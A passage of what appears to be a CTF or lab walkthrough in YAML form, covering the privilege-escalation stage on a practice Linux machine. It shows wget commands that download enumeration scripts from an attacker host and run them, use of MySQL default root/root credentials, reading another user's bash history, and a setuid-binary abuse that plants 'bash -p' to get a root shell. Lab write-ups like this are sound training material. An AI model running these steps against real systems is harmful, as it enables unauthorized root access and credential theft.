  privesc:
    steps:
      - description: |
          We start with downloading the privesc enumerations scripts:
        command: |
          wget http://192.168.92.163:8000/lse.sh ; chmod +x ./lse.sh ; ./lse.sh | tee lse.txt
          wget http://192.168.92.163:8000/linenum.sh ; chmod +x ./linenum.sh ; ./linenum.sh | tee linenum.txt
          wget http://192.168.92.163:8000/linuxprivchecker.py ; chmod +x ./linuxprivchecker.py ; python ./linuxprivchecker.py | tee linuxprivchecker.txt
      - description: |
          We also explore the `home` directories of users and find some inetresting files:
        command: |
          /home/user3/shell → setuid
          /home/user4/abc.txt → owned by root
          /home/user5/script → setuid
        screenshot:
          - ./screenshot03.png
          - ./screenshot04.png
          - ./screenshot05.png
      - description: |
          From `linenum.sh` scan, we find that the MySQL service allows login with the default credentials `root/root`. We use this to connect and get credentials for the `mysql` user:
        screenshot:
          - ./screenshot07.png
          - ./screenshot07a.png
      - description: |
          We investigate the `setuid` files now. Since the first `setuid` file `/home/user3/shell` is owned by `user3`, we checkout their `.bash_history` to see possible usage commands:
        command: |
          cat /home/user3/.bash_history
        screenshot:
          - ./screenshot08.png
          - ./screenshot08a.png
      - description: |
          We find that the `/home/user3/shell` file requries a `.script.sh` file and needs it to have executable permissions. We create this file and test out the `shell` file which gives us an elevated shell:
        command: |
          echo -en "bash -p" >>./.script.sh
          chmod +x ./.script.sh
          /home/user3/shell
        screenshot:
          - ./screenshot09.png
